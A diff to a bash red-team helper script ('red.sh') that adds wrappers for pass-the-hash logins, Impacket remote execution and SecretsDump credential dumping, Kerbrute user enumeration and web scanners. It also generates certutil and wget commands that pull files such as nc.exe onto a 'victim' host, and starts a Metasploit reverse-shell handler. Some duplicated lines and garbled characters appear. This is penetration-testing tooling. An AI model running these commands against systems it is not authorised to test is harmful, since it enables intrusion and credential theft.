@@ -88,190 +88,6 @@ require_tool() {
 }
 
 # ==============================================================================
-# INTERACTIVE MODE (--interactive)
-# ==============================================================================
-module_interactive() {
-    echo -e "${C_BOLD}${C_HEADER}╔════════════════════════════════════════════════════╗${C_ENDC}"
-    echo -e "${C_BOLD}${C_HEADER}║     🔴 INTERACTIVE MODE - GUIDED SETUP 🔴         ║${C_ENDC}"
-    echo -e "${C_BOLD}${C_HEADER}╚════════════════════════════════════════════════════╝${C_ENDC}"
-    echo ""
-    
-    echo -e "${C_BOLD}Select a module:${C_ENDC}"
-    echo "  1) Infrastructure Enumeration (--infra)"
-    echo "  2) File Transfer (--file)"
-    echo "  3) Web Reconnaissance (--web)"
-    echo "  4) Exit"
-    echo ""
-    read -p "Enter choice [1-4]: " module_choice
-    
-    case $module_choice in
-        1)
-            echo ""
-            echo -e "${C_OKCYAN}[*] Infrastructure Enumeration Selected${C_ENDC}"
-            echo ""
-            read -p "Enter target IP/hostname: " target
-            
-            echo ""
-            echo -e "${C_BOLD}Select action(s) (space-separated numbers):${C_ENDC}"
-            echo "  1) Nmap scan"
-            echo "  2) Rustscan"
-            echo "  3) SMB enumeration (smbclient)"
-            echo "  4) SMB mapping (smbmap)"
-            echo "  5) enum4linux-ng"
-            echo "  6) NetExec (nxc)"
-            echo "  7) BloodHound"
-            echo "  8) FTP enumeration"
-            echo "  9) RDP connection"
-            echo "  10) SSH connection"
-            read -p "Enter choices (e.g., 1 3 5): " actions
-            
-            read -p "Credentials needed? (y/n): " need_creds
-            local cred_flag=""
-            if [[ "$need_creds" == "y" ]]; then
-                read -p "Enter username: " username
-                read -s -p "Enter password: " password
-                echo ""
-                cred_flag="-U $username:$password"
-            fi
-            
-            read -p "Domain name (if applicable, press Enter to skip): " domain
-            local domain_flag=""
-            [[ -n "$domain" ]] && domain_flag="-d $domain"
-            
-            read -p "Copy command only without executing? (y/n): " copy_only
-            local copy_flag=""
-            [[ "$copy_only" == "y" ]] && copy_flag="-c"
-            
-            # Build command
-            local cmd="$0 --infra"
-            for action in $actions; do
-                case $action in
-                    1) cmd="$cmd -nmap" ;;
-                    2) cmd="$cmd -rust" ;;
-                    3) cmd="$cmd -smb-c" ;;
-                    4) cmd="$cmd -smb-m" ;;
-                    5) cmd="$cmd -enum4" ;;
-                    6) cmd="$cmd -nxc" ;;
-                    7) cmd="$cmd -bloodhound" ;;
-                    8) cmd="$cmd -ftp" ;;
-                    9) cmd="$cmd -rdp" ;;
-                    10) cmd="$cmd -ssh" ;;
-                esac
-            done
-            cmd="$cmd $cred_flag $domain_flag $copy_flag $target"
-            
-            echo ""
-            log_success "Generated command:"
-            echo -e "${C_OKGREEN}$cmd${C_ENDC}"
-            echo ""
-            read -p "Execute this command? (y/n): " execute
-            if [[ "$execute" == "y" ]]; then
-                eval "$cmd"
-            fi
-            ;;
-            
-        2)
-            echo ""
-            echo -e "${C_OKCYAN}[*] File Transfer Selected${C_ENDC}"
-            echo ""
-            read -p "Enter network interface (e.g., tun0, eth0): " iface
-            read -p "Enter filename to transfer: " filename
-            
-            echo ""
-            echo -e "${C_BOLD}Select download tool for victim:${C_ENDC}"
-            echo "  1) wget (Linux)"
-            echo "  2) curl (Linux/Mac)"
-            echo "  3) iwr/Invoke-WebRequest (PowerShell)"
-            echo "  4) certutil (Windows)"
-            read -p "Enter choice [1-4]: " tool_choice
-            
-            local tool="wget"
-            case $tool_choice in
-                1) tool="wget" ;;
-                2) tool="curl" ;;
-                3) tool="iwr" ;;
-                4) tool="certutil" ;;
-            esac
-            
-            echo ""
-            echo -e "${C_BOLD}Select server type:${C_ENDC}"
-            echo "  1) HTTP (python3 -m http.server)"
-            echo "  2) SMB (impacket-smbserver)"
-            read -p "Enter choice [1-2]: " server_choice
-            
-            local server="http"
-            [[ "$server_choice" == "2" ]] && server="smb"
-            
-            local cmd="$0 --file -t $tool -s $server $iface $filename"
-            
-            echo ""
-            log_success "Generated command:"
-            echo -e "${C_OKGREEN}$cmd${C_ENDC}"
-            echo ""
-            read -p "Execute this command? (y/n): " execute
-            if [[ "$execute" == "y" ]]; then
-                eval "$cmd"
-            fi
-            ;;
-            
-        3)
-            echo ""
-            echo -e "${C_OKCYAN}[*] Web Reconnaissance Selected${C_ENDC}"
-            echo ""
-            read -p "Enter target domain/URL: " target
-            
-            echo ""
-            echo -e "${C_BOLD}Select scan type:${C_ENDC}"
-            echo "  1) Full workflow (Subfinder -> HTTPX)"
-            echo "  2) Subdomain enumeration (passive)"
-            echo "  3) Subdomain enumeration (active DNS)"
-            echo "  4) Web server validation (HTTPX)"
-            echo "  5) Directory bruteforce"
-            echo "  6) Virtual host discovery"
-            echo "  7) Vulnerability scan (Nuclei)"
-            read -p "Enter choice [1-7]: " scan_choice
-            
-            local scan_flag=""
-            case $scan_choice in
-                1) scan_flag="--all" ;;
-                2) scan_flag="-subfinder" ;;
-                3) scan_flag="-gobuster-dns" ;;
-                4) scan_flag="-httpx" ;;
-                5) scan_flag="-dir" ;;
-                6) scan_flag="-ffuf-vhost" ;;
-                7) scan_flag="-nuclei" ;;
-            esac
-            
-            read -p "Save output to file? (y/n): " save_output
-            local output_flag=""
-            [[ "$save_output" == "y" ]] && output_flag="-output"
-            
-            local cmd="$0 --web $target $scan_flag $output_flag"
-            
-            echo ""
-            log_success "Generated command:"
-            echo -e "${C_OKGREEN}$cmd${C_ENDC}"
-            echo ""
-            read -p "Execute this command? (y/n): " execute
-            if [[ "$execute" == "y" ]]; then
-                eval "$cmd"
-            fi
-            ;;
-            
-        4)
-            echo ""
-            log_info "Exiting interactive mode."
-            exit 0
-            ;;
-            
-        *)
-            log_error "Invalid choice."
-            exit 1
-            ;;
-    esac
-}
-
-# ==============================================================================
 # EXAMPLES / CHEAT SHEET (--examples)
 # ==============================================================================
 show_examples() {
@@ -306,7 +122,7 @@ show_examples() {
 
 🩸 Active Directory
   # BloodHound data collection
-  red.sh --infra -bloodhound -U user:pass -d domain.local 10.10.10.10
+  red.sh --infra -bloodhound -U user:pass -D domain.local 10.10.10.10
   
   # NetExec SMB enumeration
   red.sh --infra -nxc -U admin:password 10.10.10.10
@@ -323,9 +139,19 @@ show_examples() {
 
 🎯 Metasploit Handler
   # Start reverse shell handler
-  red.sh --infra -msf -i tun0 -p 4444
+  red.sh --infra -msf -I tun0 -P 4444
 
-💡 Dry Run (Copy Only)
+� Windows & AD
+  # Evil-WinRM with Hash
+  red.sh --infra -ewinrm -U Administrator -H <NTLM_HASH> 10.10.10.10
+  
+  # Impacket PsExec
+  red.sh --infra -psexec -U admin:pass 10.10.10.10
+  
+  # Kerbrute User Enum
+  red.sh --infra -kerbrute -D domain.local 10.10.10.10
+
+�💡 Dry Run (Copy Only)
   # Generate command without executing
   red.sh --infra -nmap -c 10.10.10.10
 
@@ -349,6 +175,12 @@ show_examples() {
   
   # Certutil download
   red.sh --file -t certutil tun0 nc.exe
+  
+  # SCP Transfer
+  red.sh --file -t scp tun0 payload.exe
+  
+  # Base64 Encode
+  red.sh --file -b64 tun0 payload.bin
 
 📂 SMB Transfer
   # Start SMB server
@@ -385,6 +217,15 @@ show_examples() {
   
   # Virtual host discovery
   red.sh --web example.com -ffuf-vhost
+  
+  # Feroxbuster Scan
+  red.sh --web http://example.com -ferox
+  
+  # WordPress Scan
+  red.sh --web http://example.com -wpscan
+  
+  # Parameter Discovery
+  red.sh --web http://example.com -arjun
 
 🛡️  Vulnerability Scanning
   # Nuclei vulnerability scan
@@ -434,6 +275,8 @@ module_infra() {
     local USERPASS=""
     local USERNAME=""
     local PASSWORD=""
+    local PASSWORD=""
+    local HASH=""
     local DOMAIN=""
     
     local ACTIONS=()
@@ -441,7 +284,7 @@ module_infra() {
 
     # Infra Usage
     usage_infra() {
-        echo -e "${C_BOLD}Infra Usage:${C_ENDC} $0 --infra [options] <target>"
+        echo -e "${C_BOLD}Infra Usage:${C_ENDC} $0 --infra|-i [options] <target>"
         echo ""
         echo "Options:"
         echo "  -nmap           Run Nmap scan"
@@ -455,10 +298,16 @@ module_infra() {
         echo "  -msf            Start msfconsole handler"
         echo "  -rdp            Run RDP"
         echo "  -ssh            Run SSH"
+        echo "  -ewinrm         Run Evil-WinRM"
+        echo "  -psexec         Run Impacket PsExec"
+        echo "  -wmiexec        Run Impacket WMIexec"
+        echo "  -secrets        Run Impacket SecretsDump"
+        echo "  -kerbrute       Run Kerbrute User Enum"
         echo "  -U user:pass    Credentials (e.g., admin:password123)"
-        echo "  -d domain       Domain name"
-        echo "  -i iface        Interface (default: tun0)"
-        echo "  -p port         LPORT (default: 4444)"
+        echo "  -H hash         NTLM Hash (for Pass-the-Hash)"
+        echo "  -D domain       Domain name"
+        echo "  -I iface        Interface (default: tun0)"
+        echo "  -P port         LPORT (default: 4444)"
         echo "  -c              Copy command only (Dry Run)"
         echo ""
         echo -e "${C_BOLD}Examples:${C_ENDC}"
@@ -472,7 +321,7 @@ module_infra() {
         echo "  $0 --infra -nmap -smb-c -enum4 10.10.10.10"
         echo ""
         echo "  # BloodHound collection"
-        echo "  $0 --infra -bloodhound -U user:pass -d domain.local 10.10.10.10"
+        echo "  $0 --infra -bloodhound -U user:pass -D domain.local 10.10.10.10"
         echo ""
         echo "  # RDP connection with shared folder"
         echo "  $0 --infra -rdp -U admin:password 10.10.10.10"
@@ -497,18 +346,30 @@ module_infra() {
             -nmap) ACTIONS+=("nmap") ;;
             -rust) ACTIONS+=("rust") ;;
             -rdp) ACTIONS+=("rdp") ;;
+            -rdp) ACTIONS+=("rdp") ;;
             -ssh) ACTIONS+=("ssh") ;;
+            -ewinrm) ACTIONS+=("ewinrm") ;;
+            -psexec) ACTIONS+=("psexec") ;;
+            -wmiexec) ACTIONS+=("wmiexec") ;;
+            -secrets) ACTIONS+=("secrets") ;;
+            -kerbrute) ACTIONS+=("kerbrute") ;;
+            -H) HASH=$2; shift ;;
             -U) 
                 USERPASS=$2
-                USERNAME="${USERPASS%%:*}"
-                PASSWORD="${USERPASS#*:}"
+                if [[ "$USERPASS" == *":"* ]]; then
+                    USERNAME="${USERPASS%%:*}"
+                    PASSWORD="${USERPASS#*:}"
+                else
+                    USERNAME="$USERPASS"
+                    PASSWORD=""
+                fi
                 shift 
                 ;;
-            -i) INTERFACE=$2; shift ;;
-            -p) PORT=$2; shift ;;
-            -P) PAYLOAD=$2; shift ;;
+            -I) INTERFACE=$2; shift ;;
+            -P) PORT=$2; shift ;;
+            --payload) PAYLOAD=$2; shift ;;
             -c) CLIPBOARD=true ;;
-            -d) DOMAIN=$2; shift ;;
+            -D) DOMAIN=$2; shift ;;
             -*) 
                 log_error "Unknown infra option: $1"
                 echo -e "${C_WARNING}Hint: Run '$0 --infra -h' to see all available options${C_ENDC}"
@@ -609,6 +470,56 @@ module_infra() {
                 fi
                 execute_cmd "$CLIPBOARD" "sshpass" "-p" "$PASSWORD" "ssh" "$USERNAME@$TARGET"
                 ;;
+            ewinrm)
+                local cmd=("evil-winrm" "-i" "$TARGET")
+                [ -n "$USERNAME" ] && cmd+=("-u" "$USERNAME")
+                [ -n "$PASSWORD" ] && cmd+=("-p" "$PASSWORD")
+                [ -n "$HASH" ] && cmd+=("-H" "$HASH")
+                execute_cmd "$CLIPBOARD" "${cmd[@]}"
+                ;;
+            psexec)
+                local creds=""
+                if [ -n "$USERNAME" ]; then
+                    creds="$USERNAME"
+                    [ -n "$PASSWORD" ] && creds="${creds}:$PASSWORD"
+                fi
+                [ -n "$HASH" ] && [ -n "$USERNAME" ] && creds="${USERNAME}" # Impacket uses -hashes for hash
+                
+                local cmd=("impacket-psexec" "$creds@$TARGET")
+                [ -n "$HASH" ] && cmd+=("-hashes" "$HASH")
+                execute_cmd "$CLIPBOARD" "${cmd[@]}"
+                ;;
+            wmiexec)
+                local creds=""
+                if [ -n "$USERNAME" ]; then
+                    creds="$USERNAME"
+                    [ -n "$PASSWORD" ] && creds="${creds}:$PASSWORD"
+                fi
+                [ -n "$HASH" ] && [ -n "$USERNAME" ] && creds="${USERNAME}"
+                
+                local cmd=("impacket-wmiexec" "$creds@$TARGET")
+                [ -n "$HASH" ] && cmd+=("-hashes" "$HASH")
+                execute_cmd "$CLIPBOARD" "${cmd[@]}"
+                ;;
+            secrets)
+                local creds=""
+                if [ -n "$USERNAME" ]; then
+                    creds="$USERNAME"
+                    [ -n "$PASSWORD" ] && creds="${creds}:$PASSWORD"
+                fi
+                [ -n "$HASH" ] && [ -n "$USERNAME" ] && creds="${USERNAME}"
+                
+                local cmd=("impacket-secretsdump" "$creds@$TARGET")
+                [ -n "$HASH" ] && cmd+=("-hashes" "$HASH")
+                execute_cmd "$CLIPBOARD" "${cmd[@]}"
+                ;;
+            kerbrute)
+                local cmd=("kerbrute" "userenum" "--dc" "$TARGET" "-d" "$DOMAIN" "users.txt")
+                if [ -z "$DOMAIN" ]; then
+                     log_warn "Kerbrute usually requires a domain (-d)."
+                fi
+                execute_cmd "$CLIPBOARD" "${cmd[@]}"
+                ;;
         esac
     done
 }
@@ -624,12 +535,13 @@ module_file() {
     local FILENAME=""
 
     usage_file() {
-        echo -e "${C_BOLD}File Usage:${C_ENDC} $0 --file [options] <interface> <filename>"
+        echo -e "${C_BOLD}File Usage:${C_ENDC} $0 --file|-f [options] <interface> <filename>"
         echo ""
         echo "Options:"
         echo "  -w            Add output flag (-O/-o)"
-        echo "  -t <tool>     wget | curl | iwr | certutil (default: wget)"
+        echo "  -t <tool>     wget | curl | iwr | certutil | scp (default: wget)"
         echo "  -s <server>   http | smb (default: http)"
+        echo "  -b64          Base64 encode file content"
         echo ""
         echo -e "${C_BOLD}Examples:${C_ENDC}"
         echo "  # Start HTTP server and generate wget command"
@@ -646,6 +558,9 @@ module_file() {
         echo ""
         echo "  # Generate certutil command for Windows"
         echo "  $0 --file -t certutil eth0 nc.exe"
+        echo ""
+        echo "  # Base64 encode a file"
+        echo "  $0 --file -b64 tun0 payload.bin"
         exit 1
     }
 
@@ -655,6 +570,7 @@ module_file() {
             -w) SAVE_FILE=true ;;
             -t) TOOL="$2"; shift ;;
             -s) SERVER="$2"; shift ;;
+            -b64) TOOL="base64" ;;
             -*) 
                 log_error "Unknown file option: $1"
                 echo -e "${C_WARNING}Hint: Run '$0 --file -h' to see all available options${C_ENDC}"
@@ -701,8 +617,27 @@ module_file() {
         certutil)
             cmd_arr=("certutil" "-urlcache" "-split" "-f" "http://$IP_ADDR:8000/$FILENAME" "$FILENAME")
             ;;
+        scp)
+            local curr_dir=$(pwd)
+            cmd_arr=("scp" "user@$IP_ADDR:$curr_dir/$FILENAME" ".")
+            ;;
+        base64)
+            if [ -f "$FILENAME" ]; then
+                echo -e "${C_OKGREEN}[+] Base64 encoded content of $FILENAME:${C_ENDC}"
+                if [[ "$(uname -s)" == "Darwin" ]]; then
+                    base64 -b 0 < "$FILENAME"
+                else
+                    base64 -w 0 < "$FILENAME"
+                fi
+                echo ""
+                return
+            else
+                log_error "File '$FILENAME' not found locally for base64 encoding."
+                exit 1
+            fi
+            ;;
         *) 
-            log_error "Invalid tool. Options: wget, curl, iwr, certutil"
+            log_error "Invalid tool. Options: wget, curl, iwr, certutil, scp"
             echo -e "${C_WARNING}Example: $0 --file -t curl tun0 file.txt${C_ENDC}"
             exit 1 
             ;;
@@ -710,6 +645,10 @@ module_file() {
 
     # Just print/copy the download command, don't execute it (since it's for the victim)
     copy_to_clipboard "${cmd_arr[*]}"
+
+    if [[ "$TOOL" == "base64" || "$TOOL" == "scp" ]]; then
+        return
+    fi
 
     log_info "Starting $SERVER server on $INTERFACE ($IP_ADDR)..."
     if [ "$SERVER" = "http" ]; then
@@ -735,7 +674,7 @@ module_web() {
     local PORT=""
 
     usage_web() {
-        echo -e "${C_BOLD}Web Usage:${C_ENDC} $0 --web <target> [scan_flag]"
+        echo -e "${C_BOLD}Web Usage:${C_ENDC} $0 --web|-w <target> [scan_flag]"
         echo ""
         echo "Flags:"
         echo "  --all                Full workflow (Subfinder -> HTTPX)"
@@ -744,7 +683,10 @@ module_web() {
         echo "  -httpx               Web Server Validation"
         echo "  -subzy               Takeover"
         echo "  -dir                 Dir Bruteforce"
+        echo "  -ferox               Feroxbuster Dir Scan"
         echo "  -nuclei              Vuln Scan"
+        echo "  -wpscan              WordPress Scan"
+        echo "  -arjun               Parameter Discovery"
         echo "  -zap                 OWASP ZAP"
         echo "  -output              Enable file output"
         echo "  -c                   Copy command only"
@@ -785,7 +727,10 @@ module_web() {
             -subzy|--subzy) SCAN_MODE="subzy" ;;
             -katana|--katana) SCAN_MODE="katana" ;;
             -dir|--dir) SCAN_MODE="dir" ;;
+            -ferox|--ferox) SCAN_MODE="ferox" ;;
             -nuclei|--nuclei) SCAN_MODE="nuclei" ;;
+            -wpscan|--wpscan) SCAN_MODE="wpscan" ;;
+            -arjun|--arjun) SCAN_MODE="arjun" ;;
             -zap|--zap) SCAN_MODE="zap" ;;
             -waf|--waf) SCAN_MODE="waf" ;;
             -screenshots|--screenshots) SCAN_MODE="screenshots" ;;
@@ -859,9 +804,21 @@ module_web() {
             cmd=("ffuf" "-u" "$URL/FUZZ" "-w" "$WORDLIST_DIR" "-ic")
             $OUTPUT_ENABLED && cmd+=("-o" "ffuf_dir_output.txt")
             ;;
+        "ferox")
+            cmd=("feroxbuster" "-u" "$URL" "-w" "$WORDLIST_DIR")
+            $OUTPUT_ENABLED && cmd+=("-o" "ferox_output.txt")
+            ;;
         "nuclei")
             cmd=("nuclei" "-u" "$URL")
             $OUTPUT_ENABLED && cmd+=("-o" "nuclei_output.txt")
+            ;;
+        "wpscan")
+            cmd=("wpscan" "--url" "$URL" "--enumerate" "p,t,u")
+            $OUTPUT_ENABLED && cmd+=("-o" "wpscan_output.txt")
+            ;;
+        "arjun")
+            cmd=("arjun" "-u" "$URL")
+            $OUTPUT_ENABLED && cmd+=("-o" "arjun_output.json")
             ;;
         "all")
              log_info "[WORKFLOW] Subfinder -> HTTPX"
@@ -893,9 +850,9 @@ _pentest_helper_completion() {
     _init_completion -n : || return
 
     local main_opts="--infra --file --web --install-completion"
-    local infra_opts="-nmap -rust -smb-c -smb-m -enum4 -nxc -bloodhound -ftp -msf -rdp -ssh -U -d -i -p -P -c"
-    local file_opts="-w -t -s"
-    local web_opts="--all -subfinder -gobuster-dns -gobuster-vhost -dns -ffuf-vhost -httpx -subzy -katana -dir -nuclei -zap -waf -screenshots -tech -output -c"
+    local infra_opts="-nmap -rust -smb-c -smb-m -enum4 -nxc -bloodhound -ftp -msf -rdp -ssh -ewinrm -psexec -wmiexec -secrets -kerbrute -U -H -D -I -P --payload -c"
+    local file_opts="-w -t -s -b64"
+    local web_opts="--all -subfinder -gobuster-dns -gobuster-vhost -dns -ffuf-vhost -httpx -subzy -katana -dir -ferox -nuclei -wpscan -arjun -zap -waf -screenshots -tech -output -c"
 
     local mode=""
     for ((i=1; i < cword; i++)); do
@@ -921,66 +878,59 @@ EOF
 
 if [ $# -eq 0 ]; then
     echo -e "${C_BOLD}═══════════════════════════════════════════════════════${C_ENDC}"
-    echo -e "${C_BOLD}           🔴 RED TEAM PENTEST HELPER v2.0 🔴${C_ENDC}"
+    echo -e "${C_BOLD}            RED TEAM PENTEST HELPER v2.0 ${C_ENDC}"
     echo -e "${C_BOLD}═══════════════════════════════════════════════════════${C_ENDC}"
     echo ""
     echo -e "${C_BOLD}USAGE:${C_ENDC}"
-    echo "  $0 --infra [options] <target>  : Service Enumeration & Exploitation"
-    echo "  $0 --file [options] ...        : File Transfer Helper"
-    echo "  $0 --web <target> [flags]      : Web Reconnaissance"
-    echo "  $0 --interactive               : Interactive Mode (Guided)"
-    echo "  $0 --examples                  : Show Common Use Cases"
-    echo "  $0 --install-completion        : Generate Bash Completion"
+    echo "  $0 --infra|-i [options] <target>  : Service Enumeration & Exploitation"
+    echo "  $0 --file|-f [options] ...        : File Transfer Helper"
+    echo "  $0 --web|-w <target> [flags]      : Web Reconnaissance"
+    echo "  $0 --examples|-e                  : Show Common Use Cases"
+    echo "  $0 --install-completion           : Generate Bash Completion"
     echo ""
     echo -e "${C_BOLD}QUICK START:${C_ENDC}"
-    echo "  # Interactive mode (easiest for beginners)"
-    echo "  $0 --interactive"
-    echo ""
-    echo "  # Quick examples and cheat sheet"
-    echo "  $0 --examples"
+    echo "  # View examples and cheat sheet"
+    echo "  $0 -e"
     echo ""
     echo "  # Get detailed help for a specific module"
-    echo "  $0 --infra -h"
-    echo "  $0 --file -h"
-    echo "  $0 --web -h"
+    echo "  $0 -i -h"
+    echo "  $0 -f -h"
+    echo "  $0 -w -h"
     echo ""
     echo -e "${C_BOLD}COMMON EXAMPLES:${C_ENDC}"
-    echo "  # Scan a target with Nmap"
-    echo "  $0 --infra -nmap 10.10.10.10"
+    echo "  # Scan a target with Nmap (using alias)"
+    echo "  $0 -i -nmap 10.10.10.10"
     echo ""
-    echo "  # Transfer file to victim"
-    echo "  $0 --file tun0 linpeas.sh"
+    echo "  # Transfer file to victim (using alias)"
+    echo "  $0 -f tun0 linpeas.sh"
     echo ""
-    echo "  # Web subdomain discovery"
-    echo "  $0 --web example.com --all"
+    echo "  # Web subdomain discovery (using alias)"
+    echo "  $0 -w example.com --all"
     echo ""
     exit 1
 fi
 
 MODE="$1"
 case "$MODE" in
-    --infra) shift; module_infra "$@" ;;
-    --file) shift; module_file "$@" ;;
-    --web) shift; module_web "$@" ;;
-    --interactive) module_interactive ;;
-    --examples) show_examples ;;
+    --infra|-i) shift; module_infra "$@" ;;
+    --file|-f) shift; module_file "$@" ;;
+    --web|-w) shift; module_web "$@" ;;
+    --examples|-e) show_examples ;;
     --install-completion) generate_completion ;;
     -h|--help) 
         echo -e "${C_BOLD}Red Team Pentest Helper v2.0${C_ENDC}"
         echo ""
-        echo "Use --infra, --file, or --web followed by -h for specific help."
-        echo "Use --interactive for guided mode."
-        echo "Use --examples for a comprehensive cheat sheet."
+        echo "Use -i/-f/-w (or --infra/--file/--web) followed by -h for specific help."
+        echo "Use -e (or --examples) for a comprehensive cheat sheet."
         ;;
     *) 
         log_error "Invalid mode: $MODE"
         echo ""
         echo -e "${C_WARNING}Did you mean one of these?${C_ENDC}"
-        echo "  --infra       : Infrastructure enumeration"
-        echo "  --file        : File transfer helper"
-        echo "  --web         : Web reconnaissance"
-        echo "  --interactive : Interactive guided mode"
-        echo "  --examples    : Show examples and cheat sheet"
+        echo "  -i | --infra    : Infrastructure enumeration"
+        echo "  -f | --file     : File transfer helper"
+        echo "  -w | --web      : Web reconnaissance"
+        echo "  -e | --examples : Show examples and cheat sheet"
         echo ""
         echo "Run '$0' without arguments to see the full help menu."
         exit 1
